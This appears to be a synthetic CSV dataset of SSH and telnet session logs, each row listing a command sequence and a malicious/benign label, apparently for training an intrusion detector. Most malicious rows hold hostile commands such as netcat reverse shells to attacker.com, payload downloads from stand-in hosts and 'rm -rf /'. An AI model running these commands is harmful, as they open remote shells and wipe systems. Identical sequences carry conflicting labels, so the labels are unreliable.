session,src_ip,protocol,duration,input_token_count,unique_commands,command_sequence,label
9f5279b8-8dd2-4d14-a4fe-bdec304551a3,239.245.162.120,ssh,255.82,12,4,curl -O http://badhost/exploit; rm -rf /; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/,1
7a2436a5-eef9-4e34-b82f-803085576301,37.111.234.248,ssh,82.93,14,5,python -m http.server 8080; curl -O http://badhost/exploit; chmod +x payload.sh; rm -rf /; ./payload.sh,1
25a23e5f-943f-4e3a-aea9-58291fbcfd3f,225.64.116.39,telnet,660.22,20,6,nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; python -m http.server 8080; rm -rf /,1
150131f3-a1d0-48a9-960f-4f0f4039566a,182.24.232.5,ssh,885.91,14,4,./payload.sh; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x,1
ec342ba9-fd4e-408f-b965-016f91b01197,12.111.157.247,telnet,93,5,4,ls; exit; cd /home; uptime,0
4dda8358-39d4-471b-b2a2-56700ba90746,251.223.126.99,telnet,549.37,16,5,scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; curl -O http://badhost/exploit,1
aac8945f-ec0e-41b8-b9ac-4fcfdbc3784b,249.216.244.136,telnet,843.2,21,4,nc -e /bin/sh attacker.com 4444; python -m http.server 8080; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/,1
dee936cc-1dc1-4ff5-8901-24f48a1ed72a,242.194.166.47,telnet,191.34,1,2,pwd; ,0
0af67d06-fa4a-4bb9-b2e1-d5096329b9fb,161.64.46.190,telnet,828.8,11,4,./payload.sh; rm -rf /; curl -O http://badhost/exploit; python -m http.server 8080,1
0ecc1941-2e5f-4931-a5d8-d4409a7a2d6b,39.3.31.176,ssh,85.78,5,3,date; logout; nc attacker.com 4444,0
c2e3121b-8bf6-4cb1-afbe-096f76337545,239.31.28.225,ssh,177.53,4,4,whoami; uptime; pwd; ls,0
50935879-8bd0-46d0-a4be-84b0ab1e4c35,166.85.168.36,telnet,114.08,1,2,; exit,0
12680c3b-c5f8-4ef9-ac8b-f57a5de4fc5e,169.137.145.43,ssh,266.93,16,4,wget http://malicious.site/payload.sh; python -m http.server 8080; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444,1
2f370517-63cc-4948-8bd6-e7546e003e05,130.49.215.109,ssh,19.55,3,3,; cd /home; ls,0
idle-extra-39,192.168.100.39,ssh,868.0335729,0,0,,0
9adb735f-e8fe-4d32-be59-f6b2250b872a,160.8.23.250,telnet,61.05,3,3,pwd; uptime; logout,0
542bde10-219a-4ab5-bf28-285b70eda52a,121.205.72.93,telnet,136.52,4,4,uptime; exit; pwd; uptime,0
2ddf7261-7169-4a01-be57-31ddbb80d368,177.30.11.5,telnet,183.04,2,4,; ; ls; exit,0
4aa28691-7d51-4ea3-9f05-5fee965a4024,172.238.84.249,ssh,48.23,3,3,date; uptime; logout,0
5217fde4-9f65-41da-b873-0fb881de2f6e,183.124.112.31,ssh,44.26,4,4,ls; cd /home; whoami; ,0
3c7a0ed6-81a0-49b1-b84d-0b33fcdde38a,25.232.237.28,ssh,635.07,20,5,chmod +x payload.sh; python -m http.server 8080; python -m http.server 8080; scp exploit.sh root@target:/tmp/; rm -rf /; chmod +x payload.sh,1
c124cf60-41de-4dfa-af71-e91e4f6081f7,178.221.95.31,ssh,275.51,17,5,scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; chmod +x payload.sh; ./payload.sh; rm -rf /; rm -rf /,1
9412bf29-5988-401c-9733-548950d80d18,97.252.52.219,ssh,171.61,2,3,whoami; exit; ,0
b87b187b-fc23-4b3b-9ac8-84766726100e,243.98.52.200,ssh,337.43,14,5,./payload.sh; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; ./payload.sh; scp exploit.sh root@target:/tmp/,1
3fe61aad-9228-4ce0-9782-5562b56c7667,219.142.85.67,telnet,125.92,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
e6e0163f-fcbc-45df-82de-5969607cd0a2,62.16.199.233,ssh,485.45,14,5,chmod +x payload.sh; rm -rf /; ./payload.sh; echo 'pwned' > /tmp/x; chmod +x payload.sh,1
f6fd7aee-be39-4204-b43a-67cbd3de018c,4.79.6.89,ssh,103.51,3,4,pwd; ls; pwd; ,0
214a3b0f-6e8a-40a1-889a-2d0d1aca7c24,127.56.242.46,telnet,550.89,12,4,python -m http.server 8080; rm -rf /; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh,1
91c7b2c3-ef9f-4e2f-923f-35e641621301,123.125.131.67,ssh,288.76,2,2,date; ls,0
a1cff896-dd46-41fc-ab04-f48f8a78fc5a,250.61.201.186,ssh,272.61,0,2,; ; ,0
ca1d7326-0764-42a2-a2a7-8c436c197a4b,220.251.216.32,ssh,133.06,0,2,; ,0
idle-18,192.168.1.18,telnet,631.9941406,0,0,,0
75fc50fb-ddd9-4896-bb49-fa7728a6b30a,141.178.212.251,ssh,211.01,24,6,./payload.sh; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; python -m http.server 8080; python -m http.server 8080; chmod +x payload.sh; echo 'pwned' > /tmp/x,1
af16738c-03b6-4556-9ea3-1b7b5d848cab,39.181.186.206,ssh,609.92,12,5,wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; python -m http.server 8080; ./payload.sh,1
ebb86a66-cccd-4a39-a73e-5092d742ae3c,49.186.138.97,ssh,29.92,4,3,ls; whoami; cd /home,0
5d5e8a66-062f-4721-82fd-824d801d0e9f,101.163.242.250,ssh,42.16,3,3,uptime; cd /home; ; ,0
097328c4-696b-4e77-9ddf-a73f7c77bce6,248.81.29.13,ssh,120.65,15,4,sshpass -p '1234' ssh root@target; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x,1
ambiguous-extra-31,10.1.0.31,telnet,69.61503864,3,2,wget http://bad.com; cd /; pwd,1
f657e392-5e8b-4cb0-b1f0-7be3d896c588,194.59.60.135,ssh,47.46,19,5,curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; rm -rf /; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target,1
3248cdda-601e-45ee-ae6a-fe38c2960aaa,37.58.101.147,ssh,172.84,16,3,rm -rf /; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh,1
622b278b-ee95-43e5-b7d0-f6b19ceeb91f,59.60.220.118,ssh,10.06,1,3,; ; logout,0
bb664abd-63d3-4e45-815d-6c2809ee22f3,13.159.165.146,ssh,256.84,3,3,date; ; uptime; uptime,0
de8141a1-0441-4ebb-8a4a-9c17d84def58,20.77.9.117,telnet,243.85,2,3,exit; ; logout,0
377ed2b1-9032-40eb-a3c7-21037633fe7b,198.155.50.125,telnet,293.54,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
3c678498-bcf6-4775-86f0-ed6a404ba3f5,34.128.138.183,telnet,473.7,17,4,./payload.sh; rm -rf /; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target,1
idle-extra-47,192.168.100.47,ssh,1021.140902,0,0,,0
58a31035-8127-4c05-92b0-943ae6311108,35.41.26.43,telnet,267.23,18,6,sshpass -p '1234' ssh root@target; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; rm -rf /; curl -O http://badhost/exploit; ./payload.sh,1
ambiguous-extra-25,10.1.0.25,telnet,187.6893558,17,4,whoami; curl http://exploit; wget http://bad.com,1
e3bb685f-5734-49f6-bef4-307c3b9c558a,203.52.204.82,ssh,55.62,3,4,; cd /home; ; ls,0
6d91f2eb-bd25-410a-92b1-d27756dd3295,149.188.128.211,ssh,7.37,3,3,; cd /home; ls,0
02064ce7-a22e-4b85-8de2-68fa644f9b0e,236.4.94.36,ssh,67.1,3,4,uptime; exit; ; ls,0
126e0bc6-4b0e-4fd3-bdc0-a41fa00e9663,168.206.254.215,ssh,175.25,3,4,whoami; ; pwd; logout,0
bdc12c7a-fd1e-496b-9961-9cdc085dbaf3,160.176.86.105,telnet,6.17,3,4,; pwd; date; exit,0
3c9407b1-472b-4808-828e-d98fa0939436,177.32.151.232,ssh,789.43,13,4,nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; chmod +x payload.sh,1
idle-extra-31,192.168.100.31,ssh,706.0197595,0,0,,0
bd2518fa-b91c-4452-9319-2291ab2301f6,112.157.161.200,ssh,365.14,22,6,sshpass -p '1234' ssh root@target; python -m http.server 8080; ./payload.sh; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; ./payload.sh,1
e1509f27-37cd-4dab-89ed-272b8ae7881b,140.42.63.69,telnet,109.8,1,2,pwd; ; ,0
3e9818bb-b169-4c37-b47a-7052895b55db,49.58.39.215,ssh,236.05,5,3,ls; whoami; curl -O http://badhost/file,1
ambiguous-47,10.0.0.47,ssh,33.81625515,11,4,chmod +x payload.sh; wget http://bad.com; date,1
ambiguous-extra-23,10.1.0.23,telnet,292.1444527,5,1,curl http://exploit; chmod +x payload.sh; exit; pwd,1
6a91de86-830a-4a30-b67d-a2f1c253fd52,245.173.242.208,telnet,34.64,2,3,whoami; date; ,0
231768c8-28c1-430a-a6e2-ac876d0c7817,111.181.240.105,ssh,198.14,12,4,./payload.sh; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; python -m http.server 8080,1
5c0afdfb-00c7-49ac-a36a-e0c823f46b1e,96.16.33.136,ssh,170.61,2,2,logout; logout,0
58481a4b-404a-4af7-ae41-1b3ca7bbc4e7,126.148.115.190,telnet,243.56,13,5,scp exploit.sh root@target:/tmp/; python -m http.server 8080; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; ./payload.sh,1
4da8ff45-4f6f-4409-b89e-5493541ba024,170.93.172.114,ssh,62.47,21,5,echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; rm -rf /,1
4ce9dfda-8e3c-4e95-b8cf-0fa8f11ed572,50.169.12.251,ssh,196.14,4,4,cd /home; ; whoami; pwd,0
b6aac81a-0891-4ac2-8b05-2c1aa99a2657,147.168.18.250,ssh,207.57,5,3,cd /home; logout; logout; whoami,0
ed58141c-1189-4046-b7a1-17d28d7b8be0,31.242.5.46,ssh,494.93,21,5,sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; python -m http.server 8080; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target,1
ae8cec10-c61f-4efa-a71c-6b0264cafe76,135.3.240.209,ssh,292.93,5,3,pwd; echo test; wget http://suspicious.site/x,0
d07cd637-3935-4811-8ae6-164b2694e0fc,19.195.194.56,ssh,40.69,19,5,python -m http.server 8080; python -m http.server 8080; ./payload.sh; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; ./payload.sh,1
db86fe10-2dd8-4909-9d86-745ef5af2ac8,252.17.93.68,ssh,133.48,0,2,; ; ,0
bc1472ff-8f94-4959-bccf-01ea1b0f520b,246.19.181.21,ssh,171.6,21,4,wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; rm -rf /; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; rm -rf /,1
8c38f2e0-5f2f-4964-bd64-84c2699bc922,74.187.121.247,ssh,53.89,23,6,scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; rm -rf /; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target,1
038bff3d-0e31-4665-92b5-5f6129750084,150.97.196.189,ssh,282.78,26,7,sshpass -p '1234' ssh root@target; python -m http.server 8080; sshpass -p '1234' ssh root@target; ./payload.sh; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; chmod +x payload.sh,1
1820d3b1-8bb9-4983-bc4e-03743ee3c757,215.98.244.187,ssh,607.19,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
ambiguous-extra-15,10.1.0.15,telnet,500.0328404,13,3,wget http://bad.com; ls; chmod +x payload.sh,0
f290b15a-2f10-4661-b80e-a98c56e18874,68.44.3.42,ssh,33.73,2,4,; pwd; logout; ,0
fd3691d7-7b4d-4118-90bc-793a25273c2a,96.172.193.89,ssh,519.34,22,5,./payload.sh; ./payload.sh; python -m http.server 8080; python -m http.server 8080; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit,1
f73e3e53-0585-4e7b-9c53-18eff25bea30,169.19.221.183,ssh,141.6,21,6,nc -e /bin/sh attacker.com 4444; rm -rf /; echo 'pwned' > /tmp/x; python -m http.server 8080; ./payload.sh; scp exploit.sh root@target:/tmp/; ./payload.sh,1
0fc6a7bf-81dc-45c1-a13a-0068e0156c2d,232.147.141.175,telnet,45.9,3,4,; date; logout; whoami,0
7bb806e6-3ab3-46e2-bf46-547721500e14,129.159.93.95,ssh,658.36,29,6,sshpass -p '1234' ssh root@target; rm -rf /; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444,1
1681b8ce-4403-4ec4-803a-123f9691089c,121.53.227.55,telnet,595.15,20,4,rm -rf /; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; rm -rf /; rm -rf /; chmod +x payload.sh,1
6aeb0127-4cd0-49c8-aea4-2ce2543bb73c,12.221.205.195,ssh,271.59,3,2,cd /home; logout,0
86a27597-9387-46ff-95ad-d9f490cb2dad,19.143.53.220,ssh,275.65,3,4,ls; pwd; uptime; ,0
1c345a37-3092-410d-9c0d-93150ec5a9ac,112.128.107.16,telnet,851.13,23,6,curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; rm -rf /; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; ./payload.sh,1
scan-extra-39,172.20.0.39,telnet,0,0,0,,0
d31563e0-d206-476f-a289-d51b3d58ad8a,194.206.143.49,ssh,227.76,3,2,pwd; cd /home,0
73277e92-c10d-4301-a8bc-2ff42728ebc8,184.214.1.32,ssh,187.47,22,5,wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; ./payload.sh; ./payload.sh; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; python -m http.server 8080,1
scan-extra-27,172.20.0.27,telnet,0,0,0,,0
a95df18d-1734-49a4-b068-41592e9b62c9,139.83.235.60,ssh,169.24,4,3,ls; uptime; cd /home,0
872849ad-44b4-4fd4-956e-8e771559738a,41.8.65.179,ssh,17.45,18,5,python -m http.server 8080; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; rm -rf /; python -m http.server 8080,1
ambiguous-extra-97,10.1.0.97,ssh,257.9544362,5,7,exit; date; chmod +x payload.sh; curl http://exploit,0
e4bc9e6e-f9ae-4c97-b692-8a207a95d2e2,26.151.119.152,ssh,59.58,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
4bed8656-e408-4c8d-8757-4a5dcaa21681,78.21.121.97,ssh,574.54,18,5,echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; ./payload.sh,1
1cdd4257-71f9-48ab-b052-0ffe461111df,87.217.65.214,ssh,83.97,1,2,; exit,0
c6bc490a-756f-4db1-97c2-2fafe214ebf6,232.246.1.254,ssh,103.96,2,3,; ls; logout,0
598e275a-f2b7-4a44-a6f2-97d05221649f,207.199.4.36,ssh,849.06,5,3,date; logout; nc attacker.com 4444,1
178474f3-6af4-4fc7-867e-6506d765876f,206.248.142.33,ssh,280.79,4,4,uptime; whoami; ; cd /home,0
e44ea16d-83ec-47de-a4ba-00b808583f4e,83.0.139.184,ssh,133.56,3,3,cd /home; ; pwd,0
68eda7e0-ebab-4365-ab05-733247df8a79,160.58.172.39,telnet,690.92,10,4,./payload.sh; nc -e /bin/sh attacker.com 4444; ./payload.sh; rm -rf /,1
scan-extra-29,172.20.0.29,telnet,0,0,0,,0
ambiguous-37,10.0.0.37,ssh,138.1746854,5,3,wget http://bad.com; pwd; nc -e /bin/sh attacker.com; cd /; whoami,1
d923c97c-15d2-4a5b-9db5-927fb670559f,16.119.88.179,ssh,95.65,2,2,uptime; logout,0
b543fe99-44a2-41bd-8008-1031e1766a43,237.159.192.86,ssh,54.58,2,3,uptime; ls; ,0
8dd1749d-5298-435d-8de5-09f7c04a00dd,43.201.192.172,telnet,143.75,2,4,; whoami; ; date,0
a4ab6dd5-6d3b-4b95-8177-a2cd86b5dfcf,214.74.181.136,ssh,801.55,21,6,./payload.sh; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; python -m http.server 8080; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/,1
f7889f85-1c46-49ad-a324-2449bcdea8af,213.108.112.209,telnet,586.11,25,6,scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; rm -rf /; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; chmod +x payload.sh,1
486fbed4-7636-49c9-ac31-5d8d3be4f293,105.91.195.216,ssh,257.76,1,2,; uptime,0
fa06a182-09e1-416d-96c5-2414d4856c1b,107.19.28.162,telnet,285.01,2,3,pwd; pwd; ; ,0
61d8a916-57bf-4dad-beca-11b55f905b86,28.71.180.77,ssh,167.69,4,4,cd /home; ls; pwd; ,0
c84c09a6-2dea-4057-8d3f-8a624a8b4d15,190.195.233.26,ssh,108.1,12,4,wget http://malicious.site/payload.sh; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh,1
ddd0d045-6718-4128-a1a1-279972680665,132.205.93.174,ssh,241.45,5,4,cd /home; pwd; ls; date,0
a0ee0c4c-0811-4f34-a758-e09284825188,114.240.203.12,ssh,46.23,24,7,sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; rm -rf /; nc -e /bin/sh attacker.com 4444; ./payload.sh,1
8451cdee-68c5-4004-9b9f-f73d89dca43a,217.7.207.137,ssh,820.57,17,4,sshpass -p '1234' ssh root@target; ./payload.sh; rm -rf /; rm -rf /; sshpass -p '1234' ssh root@target,1
1d047cb1-9e30-4304-8a9e-37441bd3c964,198.203.231.221,ssh,295.26,11,4,./payload.sh; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh,1
e8cf3121-4527-4216-9c80-b30936115025,33.34.110.203,ssh,306.57,17,5,chmod +x payload.sh; python -m http.server 8080; chmod +x payload.sh; rm -rf /; echo 'pwned' > /tmp/x,1
c399898c-6d59-44e8-9c02-78f641ee525f,82.201.46.36,telnet,275.53,5,3,ls; whoami; curl -O http://badhost/file,0
63a2935f-774b-4dc9-8b7b-4a80813684db,2.222.6.12,telnet,129.84,4,4,cd /home; ; date; pwd,0
a32aab93-e50f-4ea3-a0a9-a9b926da91aa,136.165.26.182,telnet,612.62,26,7,rm -rf /; nc -e /bin/sh attacker.com 4444; rm -rf /; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; sshpass -p '1234' ssh root@target,1
357f906e-d1d9-45a8-aec1-4dd419b2dc76,247.243.206.222,ssh,224.06,2,4,; ; uptime; pwd,0
2b67146f-6b04-429b-8ae5-36a6bf818658,115.253.173.107,ssh,783.76,5,3,date; logout; nc attacker.com 4444,1
45a174a7-6848-4b6a-b031-4d1c44510d40,166.81.84.100,ssh,667.98,5,3,ls; whoami; curl -O http://badhost/file,1
scan-extra-7,172.20.0.7,telnet,0,0,0,,0
443ac073-40eb-471a-94c4-170cec607c62,152.198.39.242,ssh,608.15,15,3,chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh,1
98e8bf37-e35d-4429-87e0-245d93fbf4bb,179.54.209.160,ssh,276.41,4,3,ls; uptime; cd /home,0
ambiguous-25,10.0.0.25,ssh,15.39915113,10,2,pwd; nc -e /bin/sh attacker.com; wget http://bad.com,0
6e06a33c-5c21-4c83-92b5-2766a4fc5a93,127.209.180.216,ssh,88.44,1,2,ls; ,0
c1906b2b-d14e-4984-adf5-638eb30ec3d6,53.17.114.143,telnet,31.19,3,4,whoami; ; pwd; uptime,0
a9591e37-2024-412a-a2aa-0aa1043f320b,134.221.154.132,ssh,60.03,4,4,uptime; uptime; exit; ls,0
99bbb054-99bd-4613-b878-cd8513fa1e7e,137.255.20.81,ssh,124.97,2,2,exit; uptime,0
1fbaab72-a6ee-48cb-9c86-5333acba54d4,223.179.135.49,ssh,744.5,18,5,echo 'pwned' > /tmp/x; ./payload.sh; rm -rf /; curl -O http://badhost/exploit; rm -rf /; python -m http.server 8080,1
f11df848-588f-4eff-8cbf-e59512b70692,120.156.3.76,ssh,145.94,19,6,wget http://malicious.site/payload.sh; ./payload.sh; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444; rm -rf /; chmod +x payload.sh,1
27e86cb8-5a5f-4855-8f84-e72d65bce774,229.25.38.3,ssh,192.88,2,3,date; ; pwd,0
95b13013-70cb-4d12-b2aa-fec0ebec7e59,18.241.206.196,ssh,135.87,6,4,cd /home; ls; exit; cd /home,0
7596a463-286b-4b1d-89b4-5769b592d662,22.173.129.184,ssh,402.96,16,6,./payload.sh; wget http://malicious.site/payload.sh; chmod +x payload.sh; python -m http.server 8080; rm -rf /; curl -O http://badhost/exploit,1
8dc4ebea-0035-47ca-8110-0323bdd89a15,105.110.80.90,ssh,76.8,4,4,cd /home; pwd; uptime; ,0
378e3be6-f07d-497c-9862-ca530c2198d4,146.95.83.224,ssh,773.05,22,6,echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; rm -rf /; scp exploit.sh root@target:/tmp/; python -m http.server 8080; chmod +x payload.sh,1
03c584bc-17a1-418f-a140-2a86d11a716a,32.135.101.185,ssh,266.63,12,4,curl -O http://badhost/exploit; rm -rf /; ./payload.sh; sshpass -p '1234' ssh root@target,1
f7090957-2ceb-43cc-b946-15ea42eb7d19,221.236.204.210,ssh,52.72,0,2,; ,0
a0dc7f2d-2233-4bc1-93d3-301040f39a13,84.235.6.157,ssh,131.7,3,3,cd /home; logout; ,0
4f947831-9a09-446a-b13b-5b8540cc3126,141.225.101.4,ssh,104.69,1,2,pwd; ,0
966a739d-f0c0-44fc-9701-9bb2276d2a11,78.224.25.35,ssh,282.53,5,3,date; logout; nc attacker.com 4444,0
86ef96a8-113f-44ce-941f-254afb6c188b,47.69.165.114,ssh,201.31,2,2,exit; ls,0
dfe1c8a7-4b88-4dd5-becb-b2316608c9b4,139.206.139.171,telnet,109.77,1,2,; logout,0
f66c87da-01ff-45d0-8fad-47e45a26a3f9,46.114.54.74,ssh,230.76,3,4,exit; ls; logout; ,0
scan-extra-48,172.20.0.48,telnet,0,0,0,,0
ccc6ce28-9d72-441e-b3f7-2c2aeabf134d,118.3.108.126,ssh,297.96,4,2,; cd /home; cd /home,0
a39a655a-3eb2-4952-8db0-af724a8e92ee,157.245.50.190,telnet,19.78,5,3,ls; whoami; curl -O http://badhost/file,1
ambiguous-extra-36,10.1.0.36,telnet,298.7583197,7,5,ls; wget http://bad.com; date; cd /; nc -e /bin/sh attacker.com,1
14fef829-1e33-457d-bb6c-a41b2a972fc1,20.212.87.195,ssh,217.15,5,4,pwd; cd /home; date; pwd,0
808320f5-e6e9-4194-ac6e-6caafc04c323,23.50.132.173,ssh,121.22,2,4,; uptime; ; date,0
3ab83946-8e6a-4d0e-baf9-494dbef47242,243.200.69.109,ssh,586.23,13,5,./payload.sh; ./payload.sh; python -m http.server 8080; echo 'pwned' > /tmp/x; chmod +x payload.sh,1
302dace3-aa38-4ad3-8db7-6d095e9d9624,10.37.18.197,ssh,430.65,14,4,sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; python -m http.server 8080; ./payload.sh; ./payload.sh,1
e5efb2d5-ac63-4050-ad59-236641db9b76,25.57.58.227,ssh,31.98,3,3,date; exit; logout,0
c42d67e4-ef2f-49bd-b1bb-7edfe7b931ca,106.14.81.119,ssh,243.11,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
76f37e7d-80a3-469e-8945-b5e467abcf4c,224.210.250.16,telnet,110.95,4,4,ls; whoami; pwd; ls,0
09bb97f9-086c-4934-8023-ae6e2c5c8bf1,160.23.13.147,ssh,627.17,14,4,chmod +x payload.sh; sshpass -p '1234' ssh root@target; ./payload.sh; ./payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/,1
b7cb228a-ae7a-47cf-9fbd-3dd53687521c,215.252.80.241,ssh,94.7,2,2,whoami; date,0
ambiguous-extra-136,10.1.0.136,ssh,493.9179243,13,7,nc -e /bin/sh attacker.com; exit; date,0
b3cfc86e-fbfc-4a14-aad1-473b251d3082,98.207.214.155,ssh,110.78,3,3,ls; whoami; exit,0
74c4e0d9-8185-40b1-b69c-f85ffbd239ac,99.234.118.94,ssh,17.02,2,2,uptime; uptime,0
e7b0e575-910f-4333-81ef-495d10256514,120.165.207.187,ssh,668.37,18,4,wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; rm -rf /; rm -rf /; curl -O http://badhost/exploit; rm -rf /,1
06bd007c-25e7-4b6b-b001-ad122028f49c,93.170.101.205,ssh,107.87,21,5,sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; chmod +x payload.sh; curl -O http://badhost/exploit; chmod +x payload.sh,1
e817f8ed-af3b-4b62-b6ef-1988d883c1a6,210.226.228.216,ssh,822.84,18,6,scp exploit.sh root@target:/tmp/; ./payload.sh; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444,1
idle-4,192.168.1.4,ssh,755.1443325,0,0,,0
idle-extra-99,192.168.100.99,ssh,1163.265149,0,0,,0
8f11318f-fecb-4f5e-bed1-14b975c403c5,162.227.250.172,telnet,88.06,4,3,uptime; exit; exit; whoami,0
ambiguous-extra-114,10.1.0.114,telnet,519.4773874,16,5,whoami; wget http://bad.com; pwd; curl http://exploit,0
9d611fed-9c09-48a3-b71b-0a81fd7b47c9,14.148.171.113,ssh,320.93,5,3,pwd; echo test; wget http://suspicious.site/x,1
e3ede119-74ff-4c33-9d3d-bc4b99a76e44,175.203.198.90,ssh,417.59,10,4,./payload.sh; scp exploit.sh root@target:/tmp/; ./payload.sh; sshpass -p '1234' ssh root@target,1
0e4edf96-0be8-41ec-968c-6866a2a34a13,200.181.51.1,ssh,230.18,16,5,./payload.sh; echo 'pwned' > /tmp/x; rm -rf /; scp exploit.sh root@target:/tmp/; ./payload.sh; echo 'pwned' > /tmp/x,1
94124295-3867-414d-bf24-a9f9aac1e6a3,21.193.169.26,telnet,255.28,13,4,curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; rm -rf /,1
